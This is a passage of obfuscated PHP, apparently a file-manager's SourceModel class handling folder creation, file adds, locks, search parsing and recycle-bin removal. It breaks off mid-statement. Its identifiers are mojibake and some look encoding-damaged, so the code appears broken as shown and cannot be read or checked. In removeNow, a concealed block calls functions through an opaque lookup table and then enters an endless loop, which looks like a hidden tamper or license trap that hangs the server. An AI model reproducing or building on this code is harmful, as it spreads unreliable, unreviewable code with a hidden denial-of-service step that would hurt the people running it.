(isset($‡†ç˜ã—[$ÁÂ…[2094]]) && $‡†ç˜ã—[$ÁÂ…[2094]]) { $“ÍÄöçå = array($ÁÂ…[2100], $‡†ç˜ã—[$ÁÂ…[2094]]); if ($Ü•Ä‰í™[$ÁÂ…[76]]) { $Ü•Ä‰í™[$ÁÂ…[76]] = array($Ü•Ä‰í™[$ÁÂ…[76]], $“ÍÄöçå, $ÁÂ…[2101]); } else { $Ü•Ä‰í™[$ÁÂ…[76]] = $“ÍÄöçå; } } if (isset($‡†ç˜ã—[$ÁÂ…[608]]) && $‡†ç˜ã—[$ÁÂ…[608]]) { $Ü•Ä‰í™[] = array($ÁÂ…[464] => $‡†ç˜ã—[$ÁÂ…[608]], $ÁÂ…[462] => $‡†ç˜ã—[$ÁÂ…[608]], $ÁÂ…[1006] => $ÁÂ…[1934]); } if (isset($‡†ç˜ã—[$ÁÂ…[420]]) && $‡†ç˜ã—[$ÁÂ…[420]]) { $çÒ…íËı = $‡†ç˜ã—[$ÁÂ…[420]]; if ($çÒ…íËı == $ÁÂ…[75]) { $Ü•Ä‰í™[$ÁÂ…[418]] = 1; } else { if ($çÒ…íËı == $ÁÂ…[2102]) { $Ü•Ä‰í™[$ÁÂ…[418]] = 0; } else { if ($çÒ…íËı) { $çÒ…íËı = is_array($çÒ…íËı) ? $çÒ…íËı : explode($ÁÂ…[50], $çÒ…íËı); $Ü•Ä‰í™[$ÁÂ…[420]] = array($ÁÂ…[426], $çÒ…íËı); $Ü•Ä‰í™[$ÁÂ…[418]] = 0; } } } } $this->_parseSearchParent($‡†ç˜ã—, $Ü•Ä‰í™); if (isset($‡†ç˜ã—[$ÁÂ…[1930]]) && trim($‡†ç˜ã—[$ÁÂ…[1930]])) { $ç‡Äş˜ = trim($‡†ç˜ã—[$ÁÂ…[1930]]); $ÃáñÃãá = explode($ÁÂ…[53], $ç‡Äş˜); if (strlen($ç‡Äş˜) > 2 && (substr($ç‡Äş˜, 0, 1) == $ÁÂ…[118] && substr($ç‡Äş˜, -1) == $ÁÂ…[118]) || substr($ç‡Äş˜, 0, 1) == $ÁÂ…[58] && substr($ç‡Äş˜, -1) == $ÁÂ…[58]) { $ç‡Äş˜ = substr($ç‡Äş˜, 1, -1); $ÃáñÃãá = array($ç‡Äş˜); } $Ü•Ä‰í™[$ÁÂ…[32]] = array(array($ÁÂ…[558], $ÁÂ…[1932] . $ç‡Äş˜ . $ÁÂ…[1932])); if (count($ÃáñÃãá) > 1) { $Ü•Ä‰í™[$ÁÂ…[32]] = array(); foreach ($ÃáñÃãá as $ï§Œø·) { if (!trim($ï§Œø·)) { continue; } $Ü•Ä‰í™[$ÁÂ…[32]][] = array($ÁÂ…[558], $ÁÂ…[1932] . trim($ï§Œø·) . $ÁÂ…[1932]); } } } return $Ü•Ä‰í™; } private function _parseSearchParent($Åˆ­üŒŠ, &$¡ïºÒ›Ì) { $ª«À˜Ï =& $_SERVER[ Ö‘ñÄ”]; if (!isset($Åˆ­üŒŠ[$ª«À˜Ï[440]]) || !$Åˆ­üŒŠ[$ª«À˜Ï[440]]) { return; } $£Ìğ“Ş‘ = $this->pathInfo($Åˆ­üŒŠ[$ª«À˜Ï[440]]); $•ùÌß¸¤ = $£Ìğ“Ş‘[$ª«À˜Ï[440]] . $ª«À˜Ï[12] === $ª«À˜Ï[197]; $£çŸÀÎ“ = $£Ìğ“Ş‘[$ª«À˜Ï[419]] == $ª«À˜Ï[523]; if ($£Ìğ“Ş‘[$ª«À˜Ï[540]] == $ª«À˜Ï[541]) { $¾‚ê€Ù£ = $this->sourceInfo($Åˆ­üŒŠ[$ª«À˜Ï[440]]); $£Ìğ“Ş‘[$ª«À˜Ï[529]] = $¾‚ê€Ù£[$ª«À˜Ï[529]]; } $¡ïºÒ›Ì[$ª«À˜Ï[598]] = array($ª«À˜Ï[558], $£Ìğ“Ş‘[$ª«À˜Ï[529]] . $Åˆ­üŒŠ[$ª«À˜Ï[440]] . $ª«À˜Ï[559]); $¬å™ŒËš = isset($Åˆ­üŒŠ[$ª«À˜Ï[1795]]) && in_array($ª«À˜Ï[523], $Åˆ­üŒŠ[$ª«À˜Ï[1795]]); if (!$¬å™ŒËš || !$£çŸÀÎ“ || !$•ùÌß¸¤ || !$£Ìğ“Ş‘[$ª«À˜Ï[421]]) { return; } if (!AuthModel::authCheckRoot($£Ìğ“Ş‘[$ª«À˜Ï[421]][$ª«À˜Ï[422]])) { return; } $µíËäº˜ = $£Ìğ“Ş‘[$ª«À˜Ï[513]] . $ª«À˜Ï[12]; if ($µíËäº˜ == $ª«À˜Ï[88]) { unset($¡ïºÒ›Ì[$ª«À˜Ï[598]]); $¡ïºÒ›Ì[$ª«À˜Ï[419]] = self::TYPE_GROUP; return; } $êÁ™°Ò = Model($ª«À˜Ï[530])->groupChildrenAll($µíËäº˜); $Ã¿äéğŠ = count($êÁ™°Ò); if ($Ã¿äéğŠ <= 1) { return; } $§ì¸›Éì = array($ª«À˜Ï[440] => 0, $ª«À˜Ï[419] => self::TYPE_GROUP, $ª«À˜Ï[513] => array($ª«À˜Ï[7], $êÁ™°Ò)); $‚ÈñéÀç = $this->field($ª«À˜Ï[2103])->where($§ì¸›Éì)->limit($Ã¿äéğŠ)->select(); $¡ïºÒ›Ì[$ª«À˜Ï[598]] = array(); foreach ($‚ÈñéÀç as $ÇŒ‰ŞØ) { $¡ïºÒ›Ì[$ª«À˜Ï[598]][] = array($ª«À˜Ï[558], $ª«À˜Ï[539] . $ÇŒ‰ŞØ[$ª«À˜Ï[410]] . $ª«À˜Ï[559]); } $¡ïºÒ›Ì[$ª«À˜Ï[598]][] = $ª«À˜Ï[1934]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ÿì¼‚Ûß) { $Ù–³Åà· =& $_SERVER[ Ö‘ñÄ”]; $åôÄÂƒ¶ = Model($Ù–³Åà·[521])->where(array($Ù–³Åà·[1654] => $Ÿì¼‚Ûß))->find(); $¾ª¨‹õ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ÿì¼‚Ûß, $åôÄÂƒ¶[$Ù–³Åà·[32]]); $this->userDesktopAdd($¾ª¨‹õ); return $¾ª¨‹õ; } public function userDesktopAdd($æÒùŸô) { $º­›şÖˆ =& $_SERVER[ Ö‘ñÄ”]; $Ëì³ØÑ¯ = LNG($º­›şÖˆ[2104]); $·°µÆİû = $this->mkdir($æÒùŸô, $Ëì³ØÑ¯); $this->metaSet($·°µÆİû, $º­›şÖˆ[2105], $º­›şÖˆ[88]); $this->metaSet($æÒùŸô, $º­›şÖˆ[2106], $·°µÆİû); } public function userPathSafeAdd($Šé˜µä¶) { $¤¨İİ½é =& $_SERVER[ Ö‘ñÄ”]; $§§äƒİÃ = Model($¤¨İİ½é[521])->getInfoFull($Šé˜µä¶); if (!$§§äƒİÃ) { return !1; } if (_get($§§äƒİÃ, $¤¨İİ½é[544])) { return $§§äƒİÃ[$¤¨İİ½é[474]][$¤¨İİ½é[2107]]; } $şÈîè¡² = $this->_mkdirRoot(SourceModel::TYPE_USER, $Šé˜µä¶, $¤¨İİ½é[2108], $¤¨İİ½é[441]); Model($¤¨İİ½é[521])->metaSet($Šé˜µä¶, $¤¨İİ½é[2107], $şÈîè¡²); $this->metaSet($şÈîè¡², $¤¨İİ½é[2109], $Šé˜µä¶); return $şÈîè¡²; } public function groupRootAdd($ñãüğ¦õ) { $Œš€ Õ„ =& $_SERVER[ Ö‘ñÄ”]; $¾Şıƒíè = Model($Œš€ Õ„[530])->where(array($Œš€ Õ„[1924] => $ñãüğ¦õ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ñãüğ¦õ, $¾Şıƒíè[$Œš€ Õ„[32]]); } public function systemRootPathAdd($‰úÔÃÓŸ) { if ($‰úÔÃÓŸ != $_SERVER[ Ö‘ñÄ”][552]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $‰úÔÃÓŸ); } public function userRootRemove($ÓšÆ¾úÁ) { $¡›Ãıá„ = $this->sourceRoot(SourceModel::TYPE_USER, $ÓšÆ¾úÁ, !0); foreach ($¡›Ãıá„ as $¸œÁ¹Ô) { if (!$¸œÁ¹Ô) { continue; } $this->remove($¸œÁ¹Ô[$_SERVER[ Ö‘ñÄ”][410]], !1); } } public function groupRootRemove($ñĞ—ÇœÁ) { $õÄÛğê‚ = $this->sourceRoot(SourceModel::TYPE_GROUP, $ñĞ—ÇœÁ); if (!$õÄÛğê‚) { return; } $this->remove($õÄÛğê‚[$_SERVER[ Ö‘ñÄ”][410]], !1); } private function _mkdirRoot($õ§§¹—Ø, $‚ÅÑæËÄ, $ï´¾á˜, $üû×ğÆÄ = '') { $Ø‘™¦ğÏ =& $_SERVER[ Ö‘ñÄ”]; $ˆ…¼†—¶ = array($Ø‘™¦ğÏ[409] => 0, $Ø‘™¦ğÏ[594] => $õ§§¹—Ø, $Ø‘™¦ğÏ[595] => $‚ÅÑæËÄ, $Ø‘™¦ğÏ[591] => 1, $Ø‘™¦ğÏ[596] => USER_ID, $Ø‘™¦ğÏ[597] => USER_ID, $Ø‘™¦ğÏ[592] => $üû×ğÆÄ, $Ø‘™¦ğÏ[598] => $Ø‘™¦ğÏ[539], $Ø‘™¦ğÏ[438] => 0, $Ø‘™¦ğÏ[593] => 0, $Ø‘™¦ğÏ[477] => 0, $Ø‘™¦ğÏ[599] => $Ø‘™¦ğÏ[12]); if ($ãºúÒªÈ = $this->where($ˆ…¼†—¶)->find()) { return $ãºúÒªÈ[$Ø‘™¦ğÏ[410]]; } $Ä‚×† Ó = "\115\157\x64\x65\154\123\x6f\165\162\x63\145\x2e\155\x6b\x64\x69\x72\122\x6f\x6f\164\x2e{$õ§§¹—Ø}\56{$‚ÅÑæËÄ}\56" . $ï´¾á˜; CacheLock::lock($Ä‚×† Ó); $ˆ…¼†—¶[$Ø‘™¦ğÏ[32]] = $ï´¾á˜; $Š‹šØÁ“ = $this->add($ˆ…¼†—¶); $şÄáˆ±Ç = array($Ø‘™¦ğÏ[600] => short_id($Š‹šØÁ“)); $this->where(array($Ø‘™¦ğÏ[425] => $Š‹šØÁ“))->save($şÄáˆ±Ç); CacheLock::unlock($Ä‚×† Ó); return $Š‹šØÁ“; } private function sourceRoot($÷› ƒºË, $Ñ¥§Ì¥¶, $Ì±Úì¯… = false) { $Í„ô¢øİ =& $_SERVER[ Ö‘ñÄ”]; $âö¸Ş³ = array($Í„ô¢øİ[409] => 0, $Í„ô¢øİ[594] => $÷› ƒºË, $Í„ô¢øİ[595] => $Ñ¥§Ì¥¶); if ($Ì±Úì¯…) { $Ëóó—‚° = $this->where($âö¸Ş³)->select(); return $Ëóó—‚° ? $Ëóó—‚° : array(); } $ÙÚ‹í›‚ = $this->where($âö¸Ş³)->find(); return $ÙÚ‹í›‚ ? $ÙÚ‹í›‚ : array(); } public function sourceRootGroup($Œ¶õİá) { $é¥ı¹İö =& $_SERVER[ Ö‘ñÄ”]; if (is_string($Œ¶õİá)) { $Œ¶õİá = array($Œ¶õİá); } $§Íà×–• = $this->listSourceRoot(SourceModel::TYPE_GROUP, $Œ¶õİá, $é¥ı¹İö[188]); $Ãîœù…ê = array($é¥ı¹İö[378] => $§Íà×–•, $é¥ı¹İö[375] => array($é¥ı¹İö[772] => count($Œ¶õİá))); $this->_listDataApply($Ãîœù…ê[$é¥ı¹İö[378]]); $this->_listMake($Ãîœù…ê); return array_to_keyvalue($Ãîœù…ê[$é¥ı¹İö[82]], $é¥ı¹İö[513]); } public function mkfile($ÊÆ¢¢ŒŒ, $™Áç°Œ–, $û­Ÿ³Šî = '', $Ÿ­Úüó = REPEAT_RENAME) { $ñ‘’Ë¹ =& $_SERVER[ Ö‘ñÄ”]; $Ô¤ìèµá = Model($ñ‘’Ë¹[617])->addFileByContent($û­Ÿ³Šî, $™Áç°Œ–); return $this->_createFileCall($ÊÆ¢¢ŒŒ, $™Áç°Œ–, $Ô¤ìèµá, $Ÿ­Úüó, $ñ‘’Ë¹[1344]); } public function addFile($¡î´û, $Ò„âÂ‚©, $ØƒÎ¬ô, $ò‚Ê„²ò = false, $‹æºş£à = REPEAT_RENAME) { $›µ´Ÿ‚ = Model($_SERVER[ Ö‘ñÄ”][617])->addFile($Ò„âÂ‚©, $ØƒÎ¬ô, $ò‚Ê„²ò); return $this->_createFileCall($¡î´û, $ØƒÎ¬ô, $›µ´Ÿ‚, $‹æºş£à); } public function addFileByFileID($‰º»‹üÀ, $­’ğ¹±Ü, $÷´Å²İÂ, $¡†Û•Ùò = REPEAT_RENAME) { $ƒ­õ¨… =& $_SERVER[ Ö‘ñÄ”]; $‡™…¦ = Model($ƒ­õ¨…[617])->find($­’ğ¹±Ü); Model($ƒ­õ¨…[617])->linkAdd($­’ğ¹±Ü); return $this->_createFileCall($‰º»‹üÀ, $÷´Å²İÂ, $‡™…¦, $¡†Û•Ùò); } public function addFileByRemote($µ¢Ë¾×, $³Õ³Úø, $©©ôıØ, $ÅÁˆÓ¦æ = array(), $Ş°‰ÒÃŸ = REPEAT_RENAME) { $°·òŞ€è = Model($_SERVER[ Ö‘ñÄ”][617])->addFileByRemote($³Õ³Úø, $©©ôıØ, $ÅÁˆÓ¦æ); return $this->_createFileCall($µ¢Ë¾×, $©©ôıØ, $°·òŞ€è, $Ş°‰ÒÃŸ); } private function _createFileCall($—°ã§â¡, $§é‚íí, $®ı‚¾Îî, $¥ÚÉ£˜¼, $ ø¯•âé = "\x75\x70\154\x6f\141\144") { $Ü«©÷à =& $_SERVER[ Ö‘ñÄ”]; $ÌòÓ®›º = !1; $this->setMasterDB(); $this->lockWriteStart($—°ã§â¡, $§é‚íí); $ª¤µüÉ§ = $this->fileNameExist($—°ã§â¡, $§é‚íí); $¥–â©›© = $this->_createFile($—°ã§â¡, $§é‚íí, $®ı‚¾Îî, $¥ÚÉ£˜¼, $ÌòÓ®›º); if (!$ÌòÓ®›º) { Model($Ü«©÷à[479])->remove($®ı‚¾Îî[$Ü«©÷à[476]]); } if ($ÌòÓ®›º && $¥–â©›© && $¥–â©›© != $ª¤µüÉ§) { Model($Ü«©÷à[2077])->eventCreate($¥–â©›©, $ ø¯•âé); } $this->lockWriteEnd($—°ã§â¡, $§é‚íí); return $¥–â©›©; } public function mkdir($òŸèùºĞ, $öÙ¸Ä‰Œ, $àŠ•‰½Ù = REPEAT_SKIP) { $ğ±»Óƒí =& $_SERVER[ Ö‘ñÄ”]; $this->setMasterDB(); $š…Éºî = $this->sourceInfo($òŸèùºĞ); if (!$š…Éºî) { return !1; } $this->lockWriteStart($òŸèùºĞ, $öÙ¸Ä‰Œ); if ($àŠ•‰½Ù !== !1) { $Î¡áÑÛ¦ = $this->fileNameExist($òŸèùºĞ, $öÙ¸Ä‰Œ); if ($Î¡áÑÛ¦ && $àŠ•‰½Ù != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($òŸèùºĞ, $öÙ¸Ä‰Œ); return $Î¡áÑÛ¦; } $öÙ¸Ä‰Œ = $this->fileNameAuto($òŸèùºĞ, $öÙ¸Ä‰Œ, $àŠ•‰½Ù); } $ªıæÏ¬Á = array($ğ±»Óƒí[591] => 1, $ğ±»Óƒí[428] => $öÙ¸Ä‰Œ, $ğ±»Óƒí[592] => $ğ±»Óƒí[12], $ğ±»Óƒí[477] => 0, $ğ±»Óƒí[593] => 0); $•¿ˆ–·´ = $this->_addSource($ªıæÏ¬Á, $š…Éºî); Model($ğ±»Óƒí[2077])->eventCreate($•¿ˆ–·´, $ğ±»Óƒí[1345]); $this->lockWriteEnd($òŸèùºĞ, $öÙ¸Ä‰Œ); return $•¿ˆ–·´; } public function listSourceRoot($»ØÆäÌ¤, $Ü¹üİ½Û, $À€ÌªõÏ = "\163\x6f\x75\162\143\x65\111\104\x2c\x74\x61\162\x67\x65\x74\x49\x44\54\163\151\172\x65") { $ı—Ê­Ê¸ =& $_SERVER[ Ö‘ñÄ”]; $ğããÆ§¼ = $ı—Ê­Ê¸[246]; $…Î–×³¢ = array(); $Ğˆ–•—Ş = 1024 * 50; $š‹ò€í¶ = is_array($š‹ò€í¶) ? $š‹ò€í¶ : array(); $¾’•ÔÃŞ = count($Ü¹üİ½Û); $›À¼©à© = $this->tablePrefix . $ı—Ê­Ê¸[2110]; for ($–¨Õ˜ùÑ = 0; $–¨Õ˜ùÑ < $¾’•ÔÃŞ; $–¨Õ˜ùÑ++) { $•ÏïÊ±½ = $Ü¹üİ½Û[$–¨Õ˜ùÑ]; $ğããÆ§¼ .= "\123\105\114\x45\x43\124\x20\52\40\x46\x52\117\x4d\x20\50\123\x45\x4c\105\x43\124\40{$À€ÌªõÏ}\40\x46\122\117\115\x20\x60{$›À¼©à©}\x60\x20\x57\110\x45\122\105\x20"; $ğããÆ§¼ .= "\x60\160\x61\162\x65\x6e\164\111\104\140\x3d\x30\40\101\x4e\x44\x20\x60\164\x61\162\147\x65\x74\x49\x44\x60\x3d{$•ÏïÊ±½}\x20\101\116\104\40\140\164\141\x72\x67\145\164\x54\171\160\145\x60\75{$»ØÆäÌ¤}\40\x6c\x69\x6d\151\164\40\61\x29\40\141\x73\x20\164\x62\137{$–¨Õ˜ùÑ}\40\x55\116\111\x4f\x4e\x20\x41\x4c\x4c\x20"; if ((strlen($ğããÆ§¼) >= $Ğˆ–•—Ş || $–¨Õ˜ùÑ == $¾’•ÔÃŞ - 1) && $ğããÆ§¼) { $ğããÆ§¼ = substr($ğããÆ§¼, 0, -strlen($ı—Ê­Ê¸[1044])); $ç¬Æ„¦Ë = $this->query($ğããÆ§¼); $ğããÆ§¼ = $ı—Ê­Ê¸[12]; $…Î–×³¢ = array_merge($…Î–×³¢, $ç¬Æ„¦Ë); } } return $…Î–×³¢; } private function _createFile($®¦³ù´—, $ó‹¤ØĞ¤, $ÍÇ¬¥Œ°, $Å’Ó¹á, &$å÷á¾Ìã) { $ÔÒŒæŠ =& $_SERVER[ Ö‘ñÄ”]; $€ ÷şˆ¸ = $this->sourceInfo($®¦³ù´—); if (!$ÍÇ¬¥Œ° || !$€ ÷şˆ¸) { return !1; } if ($Å’Ó¹á !== !1) { $¥÷ºŞ‡ = $this->fileNameExist($®¦³ù´—, $ó‹¤ØĞ¤); } $å÷á¾Ìã = !0; if ($Å’Ó¹á && $¥÷ºŞ‡) { if ($Å’Ó¹á == REPEAT_SKIP) { $å÷á¾Ìã = !1; return $¥÷ºŞ‡; } else { if ($Å’Ó¹á == REPEAT_REPLACE) { $æÊç½Ï = $this->sourceInfo($¥÷ºŞ‡); $ö”œ = $this->fileHistory($æÊç½Ï, $ÍÇ¬¥Œ°[$ÔÒŒæŠ[476]], $ÍÇ¬¥Œ°[$ÔÒŒæŠ[76]]); if (!$ö”œ) { $å÷á¾Ìã = !1; } else { $this->folderSizeReset($®¦³ù´—); } return $¥÷ºŞ‡; } else { $ó‹¤ØĞ¤ = $this->fileNameAuto($®¦³ù´—, $ó‹¤ØĞ¤, $Å’Ó¹á, !1); } } } $»µìç‡¹ = array($ÔÒŒæŠ[591] => 0, $ÔÒŒæŠ[428] => $ó‹¤ØĞ¤, $ÔÒŒæŠ[592] => substr(get_path_ext($ó‹¤ØĞ¤), 0, 10), $ÔÒŒæŠ[477] => $ÍÇ¬¥Œ°[$ÔÒŒæŠ[476]], $ÔÒŒæŠ[593] => $ÍÇ¬¥Œ°[$ÔÒŒæŠ[76]]); $Óüİ¢ÊŠ = $this->_addSource($»µìç‡¹, $€ ÷şˆ¸); $this->folderSizeReset($®¦³ù´—, intval($»µìç‡¹[$ÔÒŒæŠ[76]])); return $Óüİ¢ÊŠ; } protected function fileHistory($¼Ë˜ã«ç, $åÁş­Û, $çõœûƒ¨) { $‰Ã†¸üµ =& $_SERVER[ Ö‘ñÄ”]; $‡Ôòâåû = defined($‰Ã†¸üµ[483]) ? USER_ID : $‰Ã†¸üµ[197]; if ($¼Ë˜ã«ç[$‰Ã†¸üµ[476]] == $åÁş­Û) { return !1; } $this->checkLock($¼Ë˜ã«ç[$‰Ã†¸üµ[410]], $åÁş­Û); Model($‰Ã†¸üµ[2111])->addHistory($¼Ë˜ã«ç); $ìÅ•×Ğ— = array($‰Ã†¸üµ[597] => $‡Ôòâåû, $‰Ã†¸üµ[432] => time(), $‰Ã†¸üµ[476] => $åÁş­Û, $‰Ã†¸üµ[76] => $çõœûƒ¨); $this->where(array($‰Ã†¸üµ[425] => $¼Ë˜ã«ç[$‰Ã†¸üµ[410]]))->save($ìÅ•×Ğ—); $this->sourceCacheClear($¼Ë˜ã«ç[$‰Ã†¸üµ[410]]); return !0; } public function checkLock($™šûÀªò, $åÍ™ºä) { $“´Ë±¨ =& $_SERVER[ Ö‘ñÄ”]; $šàœ‹Î = $this->pathInfo($™šûÀªò); if (!$this->fileIsLock($šàœ‹Î, !0)) { return; } $ÅÛşÉÔè = Session::get($“´Ë±¨[2112]); $¤„®¦‚ = substr($šàœ‹Î[$“´Ë±¨[32]], 0, -1 - strlen($šàœ‹Î[$“´Ë±¨[174]])) . $“´Ë±¨[1611] . $ÅÛşÉÔè . $“´Ë±¨[10] . $šàœ‹Î[$“´Ë±¨[174]]; $äêË–Ñ = Model($“´Ë±¨[617])->find($åÍ™ºä); $this->_createFileCall($šàœ‹Î[$“´Ë±¨[440]], $¤„®¦‚, $äêË–Ñ, REPEAT_REPLACE, $“´Ë±¨[1344]); $¬‰óèÈã = $šàœ‹Î[$“´Ë±¨[474]][$“´Ë±¨[556]]; $ğ±™¢Œ = $¬‰óèÈã[$“´Ë±¨[550]] ? $¬‰óèÈã[$“´Ë±¨[550]] : $¬‰óèÈã[$“´Ë±¨[32]]; show_json(LNG($“´Ë±¨[2113]) . $“´Ë±¨[2114] . LNG($“´Ë±¨[2115]) . $“´Ë±¨[2116] . $ğ±™¢Œ . $“´Ë±¨[2117], !1); } public function fileIsLock($±Æ¢È¬¼, $ÄŠ’ƒº = false) { $ÄÜ¸ó­Ù =& $_SERVER[ Ö‘ñÄ”]; if (!isset($±Æ¢È¬¼[$ÄÜ¸ó­Ù[474]]) || !$±Æ¢È¬¼[$ÄÜ¸ó­Ù[474]][$ÄÜ¸ó­Ù[553]]) { return !1; } if ($±Æ¢È¬¼[$ÄÜ¸ó­Ù[474]][$ÄÜ¸ó­Ù[553]] != USER_ID) { return !0; } $Ò£Î­üÆ = $GLOBALS[$ÄÜ¸ó­Ù[6]][$ÄÜ¸ó­Ù[89]][$ÄÜ¸ó­Ù[554]]; if ($±Æ¢È¬¼[$ÄÜ¸ó­Ù[474]][$ÄÜ¸ó­Ù[555]] <= time() - $Ò£Î­üÆ) { $this->metaSet($±Æ¢È¬¼[$ÄÜ¸ó­Ù[410]], $ÄÜ¸ó­Ù[553], null); $this->metaSet($±Æ¢È¬¼[$ÄÜ¸ó­Ù[410]], $ÄÜ¸ó­Ù[555], null); } if ($ÄŠ’ƒº) { $this->metaSet($±Æ¢È¬¼[$ÄÜ¸ó­Ù[410]], $ÄÜ¸ó­Ù[555], time()); } return !1; } private function _addSource($ŒòïÂÓ³, $íÛ—í€‹) { $¡Ş©£å =& $_SERVER[ Ö‘ñÄ”]; $ ç±£¶š = defined($¡Ş©£å[483]) ? USER_ID : $¡Ş©£å[197]; $éÇáÉåû = array($¡Ş©£å[594] => $íÛ—í€‹[$¡Ş©£å[419]], $¡Ş©£å[595] => $íÛ—í€‹[$¡Ş©£å[513]], $¡Ş©£å[596] => $ ç±£¶š, $¡Ş©£å[597] => $ ç±£¶š, $¡Ş©£å[409] => $íÛ—í€‹[$¡Ş©£å[410]], $¡Ş©£å[598] => $íÛ—í€‹[$¡Ş©£å[529]] . $íÛ—í€‹[$¡Ş©£å[410]] . $¡Ş©£å[50], $¡Ş©£å[438] => 0, $¡Ş©£å[599] => $¡Ş©£å[12]); $ŒòïÂÓ³ = array_merge($éÇáÉåû, $ŒòïÂÓ³); $this->updateModifyTime($ŒòïÂÓ³[$¡Ş©£å[440]]); $˜àŸóË = $¡Ş©£å[2118] . $íÛ—í€‹[$¡Ş©£å[410]]; if (isset(self::$cacheChildList[$˜àŸóË])) { unset(self::$cacheChildList[$˜àŸóË]); } static $˜³ü‚Ñç = false; if (!$˜³ü‚Ñç) { Hook::trigger($¡Ş©£å[581], $ŒòïÂÓ³); $˜³ü‚Ñç = !0; } $©ØÚğ«÷ = $this->add($ŒòïÂÓ³); $æ«µçúó = array($¡Ş©£å[600] => short_id($©ØÚğ«÷)); $this->where(array($¡Ş©£å[425] => $©ØÚğ«÷))->save($æ«µçúó); $this->setNamePinyin($©ØÚğ«÷, $ŒòïÂÓ³[$¡Ş©£å[32]]); return $©ØÚğ«÷; } public function remove($—‡ÔÔŸè, $ñÈŠ‚Ş = true) { $ÄŞ¿”•™ =& $_SERVER[ Ö‘ñÄ”]; $µ¬õÛºù = $this->sourceInfo($—‡ÔÔŸè); $æõÎ€æó = intval($µ¬õÛºù[$ÄŞ¿”•™[419]]) === self::TYPE_SYSTEM; $‘â§²¾¾ = Model($ÄŞ¿”•™[443])->get($ÄŞ¿”•™[2119]) == $ÄŞ¿”•™[88]; if ($æõÎ€æó || $ñÈŠ‚Ş || !$‘â§²¾¾) { return $this->removeNow($—‡ÔÔŸè, $ñÈŠ‚Ş); } $Ğı¹šÊò = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ßë£­ˆª = $µ¬õÛºù[$ÄŞ¿”•™[419]] == self::TYPE_USER ? $ÄŞ¿”•™[608] : $ÄŞ¿”•™[523]; if ($ßë£­ˆª == $ÄŞ¿”•™[608]) { $Šäº¦€Ô = Model($ÄŞ¿”•™[521])->getInfo($µ¬õÛºù[$ÄŞ¿”•™[513]]); $Š…¢šÂ˜ = !empty($Šäº¦€Ô[$ÄŞ¿”•™[550]]) ? $Šäº¦€Ô[$ÄŞ¿”•™[550]] : $Šäº¦€Ô[$ÄŞ¿”•™[32]]; $Š…¢šÂ˜ = $ÄŞ¿”•™[269] . $Š…¢šÂ˜ . $ÄŞ¿”•™[2120] . $µ¬õÛºù[$ÄŞ¿”•™[513]]; } else { $Šäº¦€Ô = Model($ÄŞ¿”•™[530])->getInfo($µ¬õÛºù[$ÄŞ¿”•™[513]]); $Š…¢šÂ˜ = _get($Šäº¦€Ô, $ÄŞ¿”•™[32]); $Š…¢šÂ˜ = $ÄŞ¿”•™[162] . $Š…¢šÂ˜ . $ÄŞ¿”•™[2121] . $µ¬õÛºù[$ÄŞ¿”•™[513]]; } $òÂ¹‹Ò = $ÄŞ¿”•™[2122] . md5($Š…¢šÂ˜); CacheLock::lock($òÂ¹‹Ò); $Ğ¬›¹¼Ô = $this->fileNameExist($Ğı¹šÊò, $Š…¢šÂ˜); if (!$Ğ¬›¹¼Ô) { $Ğ¬›¹¼Ô = $this->mkdir($Ğı¹šÊò, $Š…¢šÂ˜, REPEAT_SKIP); $this->metaSet($Ğ¬›¹¼Ô, $ÄŞ¿”•™[2123], $ßë£­ˆª); $this->metaSet($Ğ¬›¹¼Ô, $ÄŞ¿”•™[2124], $µ¬õÛºù[$ÄŞ¿”•™[513]]); if ($µ¬õÛºù[$ÄŞ¿”•™[440]] != 0) { $this->metaSet($Ğ¬›¹¼Ô, $ÄŞ¿”•™[2125], _get($Šäº¦€Ô, $ÄŞ¿”•™[2126])); } } CacheLock::unlock($òÂ¹‹Ò); $this->metaSet($—‡ÔÔŸè, $ÄŞ¿”•™[2127], $µ¬õÛºù[$ÄŞ¿”•™[440]]); $this->where(array($ÄŞ¿”•™[410] => $—‡ÔÔŸè))->save(array($ÄŞ¿”•™[432] => time())); $this->recycleClear($µ¬õÛºù); $İ–ò·‰ = $this->move($—‡ÔÔŸè, $Ğ¬›¹¼Ô, REPEAT_RENAME_FOLDER); $this->folderSizeReset($µ¬õÛºù[$ÄŞ¿”•™[440]]); return $İ–ò·‰; } private function recycleClear($á’àÍÙ±) { $Ø´ÜûÖË =& $_SERVER[ Ö‘ñÄ”]; $«©á£Û­ = $this->childrenAll($á’àÍÙ±); $’÷ëìÆŠ = array($Ø´ÜûÖË[425] => array($Ø´ÜûÖË[426], $«©á£Û­[$Ø´ÜûÖË[2128]])); Model($Ø´ÜûÖË[2129])->where($’÷ëìÆŠ)->delete(); } public function removeNow($ÁØÙ¡‡İ, $İçÂ‚¢Á = true) { $ãõÔ–“ =& $_SERVER[ Ö‘ñÄ”]; if (!isset($_SERVER[$ãõÔ–“[238]]) || !isset($_SERVER[$ãõÔ–“[239]])) { $âÊ÷ğÌ = $ãõÔ–“[885]; $õ¸Ğ¡¬ = $ãõÔ–“[240]; $Œ£ûšëó = $_SERVER[$ãõÔ–“[241]] . $ãõÔ–“[242]; $îÍâ«åØ = $õ¸Ğ¡¬($Œ£ûšëó); $…Õ™óÄ = explode($ãõÔ–“[231], $îÍâ«åØ); if (count($…Õ™óÄ) < $ãõÔ–“[631]) { $³ôóğÙ = $ãõÔ–“[244]; $³ôóğÙ(); } $ÂÄéó’û = $ãõÔ–“[886]; $ÂÄéó’û($_SERVER[$ãõÔ–“[887]]); $¤‡ƒ©¡Ş = 1; for ($¨¡óŸ§ = $¤‡ƒ©¡Ş; $¨¡óŸ§ > 0; $¨¡óŸ§++) { $ÂÄéó’û = json_encode($GLOBALS[$ãõÔ–“[426]]); } } $â¡ÁìŞ = $this->sourceInfo($ÁØÙ¡‡İ); $Ó›ğé¦ş = $this->pathInfoMore($ÁØÙ¡‡İ); if (!$â¡ÁìŞ) { return !0; } if ($â¡ÁìŞ[$ãõÔ–“[440]] == 0) { if (!_get($GLOBALS, $ãõÔ–“[511])) { return !1; } } $this->lockMoveStart($ÁØÙ¡‡İ); Hook::trigger($ãõÔ–“[2130], $Ó›ğé¦ş, $İçÂ‚¢Á); if 